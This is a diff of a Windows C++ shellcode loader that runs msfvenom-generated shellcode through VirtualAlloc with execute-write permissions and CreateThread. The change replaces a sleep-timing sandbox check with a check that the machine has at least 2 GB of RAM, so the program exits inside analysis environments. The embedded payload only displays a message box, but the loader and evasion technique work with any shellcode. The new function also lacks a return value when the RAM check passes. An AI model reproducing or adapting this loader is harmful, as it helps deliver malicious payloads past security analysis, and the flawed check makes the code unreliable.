@@ -1,6 +1,14 @@
 #include <windows.h>
-#include <chrono>
-#include <thread>
+
+BOOL memory_value() {
+	MEMORYSTATUSEX memoryStatus;
+	memoryStatus.dwLength = sizeof(memoryStatus);
+	GlobalMemoryStatusEx(&memoryStatus);
+	DWORD RAMMB = memoryStatus.ullTotalPhys / 1024 / 1024;
+	if (RAMMB < 2048) {
+		return false;
+	}
+}
 
 int main() {
 	// msfvenom -p windows/x64/messagebox TEXT=hello TITLE=hello -f c -v SHELLCODE
@@ -28,16 +36,9 @@ int main() {
 		"\x56\xff\xd5\x68\x65\x6c\x6c\x6f\x00\x68\x65\x6c\x6c\x6f"
 		"\x00\x75\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x00";
 
-	// get current time
-	auto start = std::chrono::system_clock::now();
-	// sleep 5s
-	std::this_thread::sleep_for(std::chrono::seconds(5));
-	// get current time
-	auto end = std::chrono::system_clock::now();
-	// define the elapsed second (delta between start and stop variable)
-	std::chrono::duration<double> elapsed_seconds = end - start;
+	bool ram_quantity = memory_value();
 
-	if (elapsed_seconds.count() <= 4.5) {
+	if (ram_quantity == false) {
 		exit(0);
 	} else {
 		PVOID shellcode_exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
@@ -45,6 +46,7 @@ int main() {
 		DWORD threadID;
 		HANDLE hThread = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)shellcode_exec, NULL, 0, &threadID);
 		WaitForSingleObject(hThread, INFINITE);
+		
 		return 0;
 	}
 }
